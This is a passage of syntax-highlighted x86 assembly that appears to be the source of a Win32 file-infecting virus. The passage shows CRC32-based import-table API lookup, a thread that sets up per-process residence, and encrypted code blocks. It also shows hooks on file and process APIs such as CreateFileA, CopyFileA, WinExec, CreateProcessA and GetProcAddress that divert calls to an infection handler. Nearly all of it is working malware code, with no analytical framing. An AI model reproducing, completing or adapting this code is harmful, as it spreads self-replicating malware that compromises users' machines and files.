    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">3Ch</span><span class="sc0">
    </span><span class="sc6">lodsw</span><span class="sc0">
    </span><span class="sc6">cwde</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">nopes</span><span class="sc0">

    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">7Ch</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    
</span><span class="sc5">SearchK32</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">K32_DLL</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">K32_Size</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">gotcha</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">14h</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">SearchK32</span><span class="sc0">
</span><span class="sc5">gotcha</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">

    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">loopy</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">00h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">nopes</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0">  </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">reloop</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">imagebase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc5">eosz_edi</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_ECX</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TempGA_IT1</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">wegotit</span><span class="sc0">
</span><span class="sc5">reloop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">loopy</span><span class="sc0">
</span><span class="sc5">wegotit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">nopes</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">GetAPI_IT_CRC32</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Thread used for hook IT desired APIs (Per-Process residence)           ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">ThrPerProcess</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0"> </span><span class="sc10">PASCAL</span><span class="sc0"> </span><span class="sc5">delta_thread</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">delta_thread</span><span class="sc0">

    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc5">TPP_Sleep</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">
</span><span class="sc5">TPP_semaphore</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">TPP_Sleep</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">TPP_SetupSEH</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">TPP_RestoreSEH</span><span class="sc0">
</span><span class="sc5">TPP_SetupSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockD</span><span class="sc4">-</span><span class="sc5">BlockD</span><span class="sc0">

</span><span class="sc5">BlockD</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">


    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetK32</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TmpModuleBase</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Hookz</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">@@hooker</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_IT_CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">@@hookshit</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetAPI_ET_CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">@@checkshit</span><span class="sc0">
</span><span class="sc5">@@hookshit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">@@checkshit</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc5">Billy_Bel</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">@@hooker</span><span class="sc0">

</span><span class="sc5">eBlockD</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

</span><span class="sc5">TPP_RestoreSEH</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">popad</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">TPP_semaphore</span><span class="sc4">],</span><span class="sc5">THREAD_SLEEPING</span><span class="sc0">

    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ExitThread</span><span class="sc0">
</span><span class="sc5">ThrPerProcess</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">
</span><span class="sc1">;|| Hooked API's handlerz                                                  ||</span><span class="sc0">
</span><span class="sc1">;[][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][][]</span><span class="sc0">

</span><span class="sc5">HookMoveFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hMoveFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCopyFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hCopyFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookGetFullPathNameA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hGetFullPathNameA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookDeleteFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hDeleteFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookWinExec</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hWinExec</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCreateFileA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hCreateFileA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCreateProcessA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hCreateProcessA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookGetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hGetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookSetFileAttributesA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hSetFileAttributesA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">Hook_lopen</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">h_lopen</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookMoveFileExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hMoveFileExA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookCopyFileExA</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hCopyFileExA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookOpenFile</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DoHookStuff</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hOpenFile</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">HookGetProcAddress</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                                  </span><span class="sc1">; Save all the registers</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">iENC_decrypt</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc5">eBlockE</span><span class="sc4">-</span><span class="sc5">BlockE</span><span class="sc0">

</span><span class="sc5">BlockE</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta Offset</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Base address of module</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">kernel</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Is EAX=K32?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">OriginalGPA</span><span class="sc0">                     </span><span class="sc1">; If not, it's not our problem</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">esp.PUSHAD_EAX</span><span class="sc4">],</span><span class="sc8">ebp</span><span class="sc0">            </span><span class="sc1">; Store delta offset</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">HGPA_RetAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Put ret address in a safe</span><span class="sc0">
                        </span><span class="sc1">; place</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc5">hGetProcAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Call original API</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Fail? Duh!</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">HGPA_SeeYa</span><span class="sc0">

    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; EBX = Address of function</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetDeltaOffset</span><span class="sc0">                  </span><span class="sc1">; EBP = Delta offset</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">nHookedAPIs</span><span class="sc0">                 </span><span class="sc1">; ECX = Number of hooked apis</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@Hookz</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; ESI = Ptr to array of API</span><span class="sc0">
                        </span><span class="sc1">; addresses</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; EDX = Counter (set to 0)</span><span class="sc0">
</span><span class="sc5">HGPA_IsHookableAPI?</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsd</span><span class="sc0">                                   </span><span class="sc1">; EAX = Address of a hooked API</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Is equal to requested address?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">HGPA_IndeedItIs</span><span class="sc0">                 </span><span class="sc1">; If yes, it's interesting 4 us</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                         </span><span class="sc1">; Get ptr to another one</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">                             </span><span class="sc1">; Increase counter</span><span class="sc0">
